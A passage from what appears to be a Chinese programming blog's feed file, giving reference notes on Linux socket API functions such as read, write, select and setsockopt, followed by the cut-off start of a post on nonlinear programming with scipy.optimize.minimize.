class="line">…</span><br></pre></td></tr></table></figure><p>注意到accept函数在无连接请求时将阻塞进程，当然我们也可以使用非阻塞式IO模型进行编程，后面会看到。</p><h2 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span> <span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span>;</span><br><span class="line">功能：从socket读取数据</span><br><span class="line">参数：</span><br><span class="line">fd－socket描述符</span><br><span class="line">buf－接收数据缓冲区</span><br><span class="line">len－要读取数据大小</span><br><span class="line">返回值n</span><br><span class="line">无数据  阻塞</span><br><span class="line">套接字缓冲区&gt;=len  读出len个字节</span><br><span class="line">n&gt;<span class="number">0</span> <span class="keyword">and</span> n&lt;len  读出n个字节</span><br><span class="line">n=<span class="number">0</span>              读通道已关闭</span><br><span class="line">n&lt;<span class="number">0</span>              出错或异常，errno为错误代码</span><br><span class="line">n=<span class="number">-1</span>,EINTR  由中断引起错误</span><br><span class="line">n=<span class="number">-1</span>,ECONNREST  网络连接有问题</span><br></pre></td></tr></table></figure><p>read并不是从网络读取数据，而只是完成从套接字接收缓冲区到接收进程应用缓冲区复制数据的任务。同时注意到，这是个系统调用，跨越了用户态和内核态。</p><h2 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write</span> <span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span>;</span><br><span class="line">功能：向socket发送数据</span><br><span class="line">参数：</span><br><span class="line">fd－socket描述符</span><br><span class="line">buf－发送数据缓冲区</span><br><span class="line">len－要发送数据大小</span><br><span class="line">返回值n</span><br><span class="line">无缓冲区阻塞</span><br><span class="line">套接字缓冲区&gt;=len写入len个字节</span><br><span class="line">n&gt;<span class="number">0</span> <span class="keyword">and</span> n&lt;len写入n个字节</span><br><span class="line">n=<span class="number">0</span>            写通道已关闭</span><br><span class="line">n&lt;<span class="number">0</span>            出错或异常，errno为错误代码</span><br><span class="line">n=<span class="number">-1</span>,EINTR由中断引起错误</span><br><span class="line">n=<span class="number">-1</span>,EPIPE网络连接有问题</span><br></pre></td></tr></table></figure><p>同read()函数一样，write函数成功返回并不意味着数据已经通过网络发送到对方主机，而只是说明已存放在套接字发送缓冲区中，等待TCP协议来发送。</p><h2 id="关闭socket"><a href="#关闭socket" class="headerlink" title="关闭socket"></a>关闭socket</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span> <span class="params">(<span class="keyword">int</span> sockfd)</span></span></span><br><span class="line">功能：关闭socket</span><br><span class="line">参数：</span><br><span class="line">sockfd－socket描述符</span><br><span class="line">返回值</span><br><span class="line"><span class="number">0</span>－成功，<span class="number">-1</span>－失败，errno为错误代码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shutdown</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> howto)</span></span>; </span><br><span class="line">功能：关闭连接</span><br><span class="line">参数：</span><br><span class="line">sockfd－socket描述符</span><br><span class="line">howto－指定关闭操作的类型</span><br><span class="line"><span class="number">0</span>：停止读</span><br><span class="line"><span class="number">1</span>：停止写</span><br><span class="line"><span class="number">2</span>：停止读、写</span><br><span class="line">返回值：<span class="number">0</span>－成功，－<span class="number">1</span>失败</span><br></pre></td></tr></table></figure><p>这两个函数名义上都是关闭套接字，但是其功能很不一样。调用close后本进程将不能再使用这个套接字描述符，但TCP可能并没有删除套接字结构，因为可能其他进程还在使用它；调用close只是将对sockfd的引用减1，直到对sockfd的引用为0时才清除sockfd。而使用shutdown 的方式可以按照howto指定的关闭手段对socket进行按需关闭，这是真正意义上的关闭，一旦调用了shutdown,所有进程都不能再使用套接字的相关功能。</p><h1 id="基于UDP的socket编程"><a href="#基于UDP的socket编程" class="headerlink" title="基于UDP的socket编程"></a>基于UDP的socket编程</h1><p>根据UDP协议，我们可以概括UDPsocket套接字编程的特点：</p><ul><li>非面向连接，不需事先建立连接；</li><li>主要通过sendto和recvfrom函数来完成数据交互；</li><li>sendto函数不会产生IO阻塞，但是recvfrom函数会。客户机可能因为数据丢失永远阻塞在recvfrom函数处。</li><li>UDP服务器通常采用循环服务器（重复型）的工作方式，不会被某一个客户独占</li><li>通常需要一些错误处理逻辑，诸如乱序，丢失，流量控制等等</li></ul><h2 id="sendto-send"><a href="#sendto-send" class="headerlink" title="sendto/send"></a>sendto/send</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">send</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> len,<span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sendto</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> len,<span class="keyword">int</span> flags,struct sockaddr *toaddr, <span class="keyword">int</span> addrlen)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">功能：向套接字发送数据</span><br><span class="line">返回值：≥<span class="number">0</span>—成功，<span class="number">-1</span>—失败</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line">fd－socket描述符</span><br><span class="line">buf－数据缓冲区</span><br><span class="line">len－缓冲区字节数</span><br><span class="line">toaddr—目的套接字地址</span><br><span class="line">addrlen—地址长度</span><br><span class="line">flags－控制参数</span><br><span class="line"></span><br><span class="line">flags=<span class="number">0</span>, send与write功能相同</span><br><span class="line">flags=MSG_DONTROUTE，告诉内核，目标主机在本地网络，无需查找路由表。适用于局域网，或同一网段</span><br><span class="line">flags=MSG_OOB，发送带外数据</span><br><span class="line">flags=MSG_DONTWAIT，如果套接字缓冲区没有足够空间，则进程不阻塞等待</span><br></pre></td></tr></table></figure><h2 id="recvfrom-recv"><a href="#recvfrom-recv" class="headerlink" title="recvfrom/recv"></a>recvfrom/recv</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recv</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> len,<span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recvfrom</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> len,<span class="keyword">int</span> flags,struct sockaddr *fromaddr, <span class="keyword">int</span> *addrlen)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">功能：从套接字读取数据</span><br><span class="line">返回值：≥<span class="number">0</span>—成功，<span class="number">-1</span>—失败</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line">fd－socket描述符</span><br><span class="line">buf－数据缓冲区</span><br><span class="line">len－缓冲区字节数</span><br><span class="line">fromaddr—源套接字地址</span><br><span class="line">addrlen—地址长度</span><br><span class="line">flags－控制参数</span><br><span class="line"></span><br><span class="line">控制参数说明</span><br><span class="line">flags=<span class="number">0</span>, recv与read功能相同</span><br><span class="line">flags=MSG_OOB，接收带外数据</span><br><span class="line">flags=MSG_DONTWAIT，套接字缓冲区没有数据时，进程不阻塞等待</span><br><span class="line">flags=MSG_WAITALL，通知内核直到读到请求的数据字节数时，才返回</span><br><span class="line">flags=MSG_PEEK，接收数据时不从缓冲区移走数据，下一个读操作将会读到同样的数据</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>注意到UDP式面向无连接的socket,在使用recvfrom的时候，还有另外一种写法。若需要知道发送方的地址，则可以在recvfrom函数中初始化参数fromaddr和addrlen由内核来填充；<br>如果不关心发送方的地址，则可以将recvfrom函数的参数fromaddr和addrlen都设置为NULL；<code>recvfrom(sockfd,buf,len,0,NULL,NULL)</code></p><h2 id="UDP假connect"><a href="#UDP假connect" class="headerlink" title="UDP假connect"></a>UDP假connect</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int connect (int sockfd, struct sockaddr *servaddr, int addrlen)</span><br><span class="line">调用方法与流式套接字相同，但调用结果不同；</span><br><span class="line">无三次握手过程，且并未建立连接；</span><br><span class="line">UDP使用连接函数后，发送数据可以不用指定地址；且只接收所建立连接的对方数据报，底层socket的接受缓冲区只接受目的地址为connect之前指定的；</span><br><span class="line">意外情况处理</span><br><span class="line">服务器缓冲区满：丢弃数据包，且不返回错误</span><br><span class="line">服务器未运行对应进程：服务器向客户机返回错误信息—ECONNRESET</span><br><span class="line">数据未成功到达：目的地不可达—路由器返回错误消息；字节错误或缓冲区满—不返回任何信息</span><br><span class="line">连接套接字取消</span><br><span class="line"></span><br><span class="line">再次调用connect函数</span><br></pre></td></tr></table></figure><h2 id="socket-其他函数"><a href="#socket-其他函数" class="headerlink" title="socket 其他函数"></a>socket 其他函数</h2><h3 id="sendmsg-amp-recvmsg"><a href="#sendmsg-amp-recvmsg" class="headerlink" title="sendmsg&amp;recvmsg"></a>sendmsg&amp;recvmsg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sendmsg</span><span class="params">(<span class="keyword">int</span> fd,struct msghdr *msgp,<span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recvmsg</span><span class="params">(<span class="keyword">int</span> fd,struct msghdr *msgp,<span class="keyword">int</span> flags)</span></span>;</span><br><span class="line">功能：发送和接收规格化的数据，配对使用</span><br><span class="line">返回值：≥<span class="number">0</span>—成功，<span class="number">-1</span>—失败</span><br><span class="line">参数：</span><br><span class="line">fd－socket描述符</span><br><span class="line">msghdr－规格化数据缓冲区</span><br><span class="line">flags－控制参数</span><br><span class="line">c</span><br></pre></td></tr></table></figure><h3 id="readv-amp-writev"><a href="#readv-amp-writev" class="headerlink" title="readv&amp;writev"></a>readv&amp;writev</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">readv和writev</span><br><span class="line"><span class="keyword">ssize_t</span> readv(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct iovec iov[],<span class="keyword">int</span> iovcnt);</span><br><span class="line"><span class="keyword">ssize_t</span> writev(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct iovec iov[],<span class="keyword">int</span> iovcnt);</span><br><span class="line">功能：一次读、写多个非连续缓冲区</span><br><span class="line">返回值：≥<span class="number">0</span>—成功，已读写字节数；<span class="number">-1</span>—失败</span><br><span class="line">参数：</span><br><span class="line">fd－socket描述符</span><br><span class="line">iov－缓冲区数组</span><br><span class="line">iovcnt－缓冲区数组个数</span><br></pre></td></tr></table></figure><h3 id="getpeername"><a href="#getpeername" class="headerlink" title="getpeername"></a>getpeername</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int getpeername(int fd,struct sockaddr *proaddr,int *addrlen);</span><br><span class="line">功能：获得对端socket的地址信息</span><br><span class="line">参数：</span><br><span class="line">fd－socket描述符</span><br><span class="line">proaddr－存放地址信息的缓冲区的指针</span><br><span class="line">addrlen－存放缓冲区字节数的整型变量的指针</span><br><span class="line">返回值：0－成功，－1失败</span><br></pre></td></tr></table></figure><p>当一个调用accept的进程通过fork和exec启动一个新的进程时，经常要调用这个函数；新的服务器通过getpeername函数来得到远端的地址。</p><h3 id="getsockname"><a href="#getsockname" class="headerlink" title="getsockname"></a>getsockname</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">getsockname</span><br><span class="line">int getsockname(int fd,struct sockaddr *proaddr,int *addrlen);</span><br><span class="line">功能：获得本地socket的地址信息</span><br><span class="line">参数：</span><br><span class="line">fd－socket描述符</span><br><span class="line">proaddr－存放地址信息的缓冲区的指针</span><br><span class="line">addrlen－存放缓冲区字节数的整型变量的指针</span><br><span class="line">返回值：0－成功，－1失败</span><br></pre></td></tr></table></figure><h3 id="获取-设置-socket参数"><a href="#获取-设置-socket参数" class="headerlink" title="获取/设置 socket参数"></a>获取/设置 socket参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">int getsockopt(int sockfd, int level, int optname, void *optval, sock_len_t *optlen);</span><br><span class="line"></span><br><span class="line">int setsockopt(int sockfd, int level, int optname, void *optval, sock_len_t optlen);</span><br><span class="line"></span><br><span class="line">功能：获取或设置socket选项</span><br><span class="line">返回值：0－成功，-1失败</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line">sockfd－socket描述符</span><br><span class="line">level－选项级别</span><br><span class="line">optname—选项名称</span><br><span class="line">optval—选项值指针 </span><br><span class="line">optlen—选项值的长度/存放选项值长度的指针  </span><br><span class="line"></span><br><span class="line">参数level 代表欲设置的网络层, 一般设成SOL_SOCKET 以存取socket 层. 参数optname 代表欲设置的选项, 有下列几种数值:</span><br><span class="line">   </span><br><span class="line">   SO_DEBUG 打开或关闭排错模式</span><br><span class="line">   SO_REUSEADDR 允许在bind ()过程中本地地址可重复使用</span><br><span class="line">   SO_TYPE 返回socket 形态.</span><br><span class="line">   SO_ERROR 返回socket 已发生的错误原因</span><br><span class="line">   SO_DONTROUTE 送出的数据包不要利用路由设备来传输.</span><br><span class="line">   SO_BROADCAST 使用广播方式传送</span><br><span class="line">   SO_SNDBUF 设置送出的暂存区大小</span><br><span class="line">   SO_RCVBUF 设置接收的暂存区大小</span><br><span class="line">   SO_KEEPALIVE 定期确定连线是否已终止.</span><br><span class="line">   SO_OOBINLINE 当接收到OOB 数据时会马上送至标准输入设备</span><br><span class="line">   SO_LINGER 确保数据安全且可靠的传送出去.</span><br><span class="line"></span><br><span class="line">下面给出一个预创建子进程的时候的参数设置样例：</span><br><span class="line"></span><br><span class="line">int n=1;</span><br><span class="line">setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&amp;n,sizeof(n));</span><br></pre></td></tr></table></figure><h2 id="fcntl"><a href="#fcntl" class="headerlink" title="fcntl"></a>fcntl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int fcntl(int fd,int cmd,…)</span><br><span class="line"></span><br><span class="line">功能：改变套接字属性</span><br><span class="line">设置socket为阻塞/非阻塞模式</span><br><span class="line">设置允许/不允许接收异步I/O信号</span><br><span class="line">设置/获取socket的所有者</span><br><span class="line">参数：</span><br><span class="line">fd－文件（socket）描述符</span><br><span class="line">cmd－执行的操作</span><br><span class="line">其他参数－根据cmd选择适当参数</span><br><span class="line">返回值：≥0－成功，-1－失败</span><br></pre></td></tr></table></figure><h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int ioctl(int fd,int req,…);</span><br><span class="line">功能：控制输入输出</span><br><span class="line">参数：</span><br><span class="line">fd－文件（socket）描述符</span><br><span class="line">req－执行的操作类型</span><br><span class="line">第三个参数－总是指针类型，存储操作返回的数据或操作所需的数据</span><br><span class="line">返回值：0－成功，-1－失败</span><br><span class="line"></span><br><span class="line">req 参数常用如下：</span><br><span class="line">SIOCATMARK   检测是否到达带外标记</span><br><span class="line">FIONBIO      非阻塞模式</span><br><span class="line">FIOASYNC     异步输入/输出标志</span><br><span class="line">SIOCSPGRP/   设置/获取目标进程或进程组</span><br><span class="line">SIOCGPGRP</span><br><span class="line">FIONREAD     缓冲区中有多少字节可读</span><br></pre></td></tr></table></figure><h2 id="多路复用函数select"><a href="#多路复用函数select" class="headerlink" title="多路复用函数select"></a>多路复用函数select</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">int select(int maxfd,fd_set *rdset,fd_set *wrest,fd_set *exset,struct timeval *timeout);</span><br><span class="line">功能：检查多个文件描述符（socket描述符）是否就绪，当某一个描述符就绪（可读、可写或发生异常）时函数返回，可以实现输入输出多路复用</span><br><span class="line">返回值：有描述符就绪则返回就绪的描述符个数；超时时间内没有描述符就绪返回0；执行失败返回 -1。</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line">maxfd－集合中所有描述符的最大值+1  </span><br><span class="line">rdset－需要测试是否可读的描述符集合（包括处于listen状态的socket接收到连接请求） </span><br><span class="line">wrset－需要测试是否可写的描述符集合（包括以非阻塞方式调用connect是否成功）  </span><br><span class="line">exset－需要测试是否异常的描述符集合（包括接收带外数据的socket有带外数据到达）   </span><br><span class="line">timeout－指定测试超时的时间 </span><br><span class="line"></span><br><span class="line">select函数监控的socket接口状态</span><br><span class="line">读：</span><br><span class="line">有数据可读</span><br><span class="line">连接的读通道被关闭</span><br><span class="line">listen的套接字已经将连接排队</span><br><span class="line">socket差错未处理</span><br><span class="line">写：</span><br><span class="line">缓存可供写操作使用</span><br><span class="line">连接的写通道被关闭</span><br><span class="line">socket差错未处理</span><br><span class="line">例外：</span><br><span class="line">OOB同步标记未处理</span><br><span class="line"></span><br><span class="line">描述符集合操作函数</span><br><span class="line">FD_ZERO(fd_set *fdset)－清空描述符集合</span><br><span class="line">FD_SET(int fd,fd_set *fdset)－将一个描述符添加到描述符集合 </span><br><span class="line">FD_CLR(int fd,fd_set *fdset)－将一个描述符从描述符集合中清除 </span><br><span class="line">FD_ISSET(int fd,fd_set *fdset)－检测一个描述符是否就绪</span><br><span class="line"></span><br><span class="line">注：在设置描述符集合前应该先调用FD_ZERO将集合清空，每次调用select函数前应该重新设置读、写和错误3个集合；三个集合中的描述符可以交叉</span><br></pre></td></tr></table></figure><h2 id="域名相关函数"><a href="#域名相关函数" class="headerlink" title="域名相关函数"></a>域名相关函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#gethostbyname</span><br><span class="line"></span><br><span class="line">include &lt;netdb.h&gt;</span><br><span class="line">struct hostent* gethostbyname(const char *name)</span><br><span class="line">功能：查询域名对应的IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gethostbyaddr</span><br><span class="line">include &lt;netdb.h&gt;</span><br><span class="line">struct hostent *gethostbyaddr(const char *addr,size_t len,int family); </span><br><span class="line">功能：查询IP对应的域名</span><br><span class="line"></span><br><span class="line">查询失败时错误类型保存在全局变量h_errno中，hstrerror可以得到h_errno的描述信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct hostent&#123;</span><br><span class="line">char *h_name;    /*主机正式名称*/</span><br><span class="line">char**h_aliases;/*别名列表，以NULL结束*/</span><br><span class="line">int h_addrtype;    /*主机地址类型：AF_INET*/</span><br><span class="line">int h_length;    /*主机地址长度：4字节32位*/</span><br><span class="line">char **h_addr_list;/*主机ip地址列表，以NULL结束*/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数模之非线性规划</title>
      <link href="/2018/12/09/%E6%95%B0%E6%A8%A1%E4%B9%8B%E9%9D%9E%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92/"/>
      <url>/2018/12/09/%E6%95%B0%E6%A8%A1%E4%B9%8B%E9%9D%9E%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前面有提到使用python做线性规划问题，有一些第三方库可以让我们快速上手，对线性规划的模型进行求解。无论是整数形线性规划还是连续形，都可以找到实用的库。但是在线性规划问题中还存在一种非线性的问题。其约束条件不是简单的呈现线性的关系，前面我们提到的两个库就不再实用，这时就要继续发现新大陆，于是就有了这篇文章。</p></blockquote><a id="more"></a><h1 id="非线性规划问题"><a href="#非线性规划问题" class="headerlink" title="非线性规划问题"></a>非线性规划问题</h1><p>首先对什么是非线性规划是什么有个感性的认识：如果目标函数或约束条件中包含非线性函数，就称这种规划问题为非线性规划问题。一般说来，解非线性规划要比解线性规划问题困难得多。而且，也不象线性规划有 单纯形法这一通用方法，非线性规划目前还没有适于各种问题的一般算法，各个方法都 有自己特定的适用范围。当然我们伟大的前人已经研究了一些算法可以求出局部最优解，或者在特定的条件下可以推出局部最优就是全局最优。或者我们可以通过类似机器学习算法里面的多次赋初始值梯度下降求局部最优，然后从不同的下降路线中找到尝试的过的最优解，这时往往可以到达全局最优，这取决于我们迭代的次数。既然前人有了一些不错的算法，那么自然就有一些前辈做出一些自动化的工具，来极大的提高生产力。所以经过一番搜索，我发现了以下两个不错的求解非线性规划问题的库。当然这也许不是最好的，但是就笔者而言，一定是最简单易用的。 </p><h2 id="scipy-optimize-minimize解决方案"><a href="#scipy-optimize-minimize解决方案" class="headerlink" title="scipy optimize minimize解决方案"></a>scipy optimize minimize解决方案</h2><p>以一个网上找的现成例子为例：<br>计算  (2+x1)/(1+x2) - 3<em>x1+4</em>x3 的最小值？（x1,x2,x3的范围都在0.1到0.9 之间）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.optimize <span class="keyword">import</span> minimize</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"> </span><br><span class="line"><span class="comment"># demo 2</span></span><br><span class="line"><span class="comment">#计算  (2+x1)/(1+x2) - 3*x1+4*x3 的最小值  x1,x2,x3的范围都在0.1到0.9 之间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(args)</span>:</span></span><br><span class="line">    a,b,c,d=args</span><br><span class="line">    v=<span class="keyword">lambda</span> x: (a+x[<span class="number">0</span>])/(b+x[<span class="number">1</span>]) -c*x[<span class="number">0</span>]+d*x[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">con</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="comment"># 约束条件 分为eq 和ineq</span></span><br><span class="line">    <span class="comment">#eq表示 函数结果等于0 ； ineq 表示 表达式大于等于0  </span></span><br><span class="line">    x1min, x1max, x2min, x2max,x3min,x3max = args</span><br><span class="line">    cons = (&#123;<span class="string">'type'</span>: <span class="string">'ineq'</span>, <span class="string">'fun'</span>: <span class="keyword">lambda</span> x: x[<span class="number">0</span>] - x1min&#125;,\</span><br><span class="line">              &#123;<span class="string">'type'</span>: <span class="string">'ineq'</span>, <span class="string">'fun'</span>: <span class="keyword">lambda</span> x: -x[<span class="number">0</span>] + x1max&#125;,\</span><br><span class="line">             &#123;<span class="string">'type'</span>: <span class="string">'ineq'</span>, <span class="string">'fun'</span>: <span class="keyword">lambda</span> x: x[<span class="number">1</span>] - x2min&#125;,\</span><br><span class="line">                &#123;<span class="string">'type'</span>: <span class="string">'ineq'</span>, <span class="string">'fun'</span>: <span class="keyword">lambda</span> x: -x[<span class="number">1</span>] + x2max&#125;,\</span><br><span class="line">            &#123;<span class="string">'type'</span>: <span class="string">'ineq'</span>, <span class="string">'fun'</span>: <span class="keyword">lambda</span> x: x[<span class="number">2</span>] - x3min&#125;,\</span><br><span class="line">             &#123;<span class="string">'type'</span>: <span class="string">'ineq'</span>, <span class="string">'fun'</span>: <span class="keyword">lambda</span> x: -x[<span class="number">2</span>] + x3max&#125;)</span><br><span class="line">    <span class="keyword">return</span> cons</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span 